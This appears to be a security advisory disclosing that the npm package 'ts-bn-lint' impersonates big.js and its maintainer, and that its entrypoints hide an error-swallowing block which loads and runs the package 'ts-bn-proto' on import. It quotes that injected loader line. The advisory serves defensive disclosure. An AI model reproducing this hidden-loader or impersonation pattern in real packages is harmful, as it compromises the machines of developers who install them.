summary: ts-bn-lint impersonates big.js and loads ts-bn-proto payload at import time
details: Package is published as 'ts-bn-lint' but ships verbatim big.js v7.0.1 source with package.json fields (author 'Michael Mclaughlin <M8ch88l@gmail.com>', repository https://github.com/MikeMcl/big.js.git) impersonating the legitimate big.js maintainer. Both the CommonJS entrypoint (big.js) and the ESM entrypoint (big.mjs) contain an injected top-level block that does `const doc = require("ts-bn-proto"); doc.from_str().then(e => {}).catch(e => {})` wrapped in an empty try/catch. Any project that does `require('ts-bn-lint')` or `import 'ts-bn-lint'` will silently resolve and execute the sibling package 'ts-bn-proto's `from_str()` on the installer's machine, with all errors and output suppressed. The advertised purpose of the package is arbitrary-precision arithmetic; loading an unrelated 'ts-bn-proto' package on every import, with error swallowing, is a hidden loader / trampoline pattern. Installing this package silently pulls and executes ts-bn-proto attacker-controlled code as a transitive dependency.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
